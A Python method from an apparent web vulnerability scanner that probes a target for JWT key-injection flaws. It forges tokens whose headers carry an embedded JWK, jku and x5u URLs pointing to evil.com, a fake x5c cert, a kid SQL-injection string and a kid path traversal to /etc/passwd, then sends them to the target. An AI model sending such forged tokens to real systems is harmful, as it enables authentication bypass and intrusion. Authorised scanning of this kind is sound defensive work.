    def test_titan_jwt_key_injection(self):
        """Wave5 Titan #4 — JWT Key Injection via param header."""
        if not self.deep: return
        self._print("[*]", "Wave5: Titan JWT Key Injection...", "INFO")
        import base64, json as _json
        # Get existing JWT
        r = self._get(self.target)
        if not r: return
        cookies = r.cookies.get_dict() if hasattr(r.cookies, 'get_dict') else {}
        jwt_token = None
        for v in list(cookies.values()) + [r.headers.get("Authorization", "").replace("Bearer ", "")]:
            if v and v.count(".") == 2:
                jwt_token = v
                break
        if not jwt_token: return
        try:
            parts = jwt_token.split(".")
            header = _json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            payload = parts[1]
        except Exception: return
        # Try key injection variants
        key_payloads = [
            # Embedded JWK with attacker's key
            {"alg": "RS256", "jwk": {"kty": "RSA", "n": "fake", "e": "AQAB"}},
            # jku pointing to attacker
            {"alg": "RS256", "jku": "https://evil.com/jwks.json"},
            # x5u pointing to attacker
            {"alg": "RS256", "x5u": "https://evil.com/cert.pem"},
            # x5c with attacker cert
            {"alg": "RS256", "x5c": ["attacker-cert"]},
            # kid with SQLi
            {"alg": "HS256", "kid": "' OR '1'='1"},
            # kid with path traversal
            {"alg": "HS256", "kid": "/etc/passwd"},
        ]
        for evil_header in key_payloads:
            try:
                header_b64 = base64.urlsafe_b64encode(
                    _json.dumps(evil_header).encode()).decode().rstrip("=")
                evil_jwt = f"{header_b64}.{payload}.fake"
                r2 = self._get(self.target,
                                headers={"Authorization": f"Bearer {evil_jwt}"})
                if r2 and r2.status_code == 200:
                    self._add_vuln(f"Wave5 JWT Key Injection: {list(evil_header.keys())}",
                                    "CRITICAL", self.target,
                                    f"Server accepted JWT with key injection header",
                                    header=list(evil_header.keys()))
            except Exception: pass

